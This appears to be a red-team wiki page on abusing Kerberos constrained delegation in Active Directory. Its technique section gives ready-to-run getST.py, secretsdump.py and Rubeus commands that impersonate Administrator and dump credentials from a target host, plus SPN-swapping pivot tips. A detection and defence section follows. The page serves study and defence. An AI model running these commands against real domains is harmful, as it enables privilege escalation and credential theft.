---
title: Constrained delegation
slug: constrained-delegation
---

> **TL;DR:** A principal configured with `msDS-AllowedToDelegateTo` chains S4U2Self + S4U2Proxy to mint service tickets for any user against the allowed SPN — including DA against juicy targets.

## What it is
Kerberos delegation lets a front-end service forward a user's identity to a backend. "Constrained" variants pin the allowed backends in `msDS-AllowedToDelegateTo`. The flag `TrustedToAuthForDelegation` (T2A4D) on the front-end further enables **protocol transition** via S4U2Self — the front-end can fabricate a usable evidence ticket for any user without that user ever authenticating to it. S4U2Proxy then turns that ticket into a service ticket for the listed SPN. If we steal the front-end account's password/hash, we steal that delegation primitive.

## Preconditions / where it applies
- Compromise (hash, password, AES key, or TGT) of an account with `msDS-AllowedToDelegateTo` populated.
- T2A4D set on that account → "any user, any protocol" S4U; without T2A4D you need a forwardable evidence ticket from the user first.
- Reachable KDC and the target SPN.
- Note: members of Protected Users / `User Cannot Be Delegated` flag block S4U2Self impersonation of those accounts.

## Technique
Find delegating accounts with [[bloodhound|BloodHound]] (`MATCH (n) WHERE n.allowedtodelegate IS NOT NULL`) or:

```bash
ldapsearch -h dc -b 'DC=corp,DC=lab' '(msds-allowedtodelegateto=*)' \
  samaccountname msds-allowedtodelegateto useraccountcontrol
```

Operate with Rubeus (Windows) or Impacket's getST.py (Linux):

```bash
# Linux — get DA ticket against CIFS on a target host
getST.py -spn cifs/target.corp.lab -impersonate Administrator \
  -dc-ip 10.0.0.1 corp/svc_delegate:'pw'
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass target.corp.lab
```

```powershell
# Windows
Rubeus.exe s4u /user:svc_delegate /rc4:<NT> /impersonateuser:Administrator `
  /msdsspn:cifs/target.corp.lab /ptt
```

S4U2Proxy ignores the SPN service-class string at validation time on most older Windows — `cifs/target` can be swapped to `host/target`, `http/target`, `ldap/target` etc. to pivot into different services on the same host. Patched DCs (after the 2022 sfu fixes) restrict this to the configured SPN's host.

Critically: the SPN list is host-scoped not service-scoped — owning delegation to `time/dc.corp.lab` historically gave full DA over the DC.

## Detection and defence
- Audit 4769 (TGS-REQ) where account ≠ user — these are S4U2Proxy results. High volume from one front-end is suspicious.
- Mark every delegating account as tier-0 — its password is equivalent to all SPNs it can delegate to.
- Add high-value accounts (DA, krbtgt, Tier-0 service owners) to Protected Users and set `User Cannot Be Delegated`.
- Prefer [[resource-based-constrained-delegation|RBCD]] (backend-controlled) over front-end-controlled constrained delegation. Remove `TrustedToAuthForDelegation` unless strictly required.
- Hunt account configuration changes — 5136 modifying `msDS-AllowedToDelegateTo` or UAC bit 0x1000000.
- See [[unconstrained-delegation]] for the worst case and [[shadow-credentials]] for credential theft that feeds this.

## References
- [HarmJ0y — Kerberos delegation](https://blog.harmj0y.net/redteaming/another-word-on-delegation/) — primitive reference
- [the.hacker.recipes — Constrained delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained) — step-by-step
- [HackTricks — Constrained delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html) — tooling examples
- [Microsoft — S4U2Self/S4U2Proxy](https://learn.microsoft.com/openspecs/windows_protocols/ms-sfu/) — protocol specs
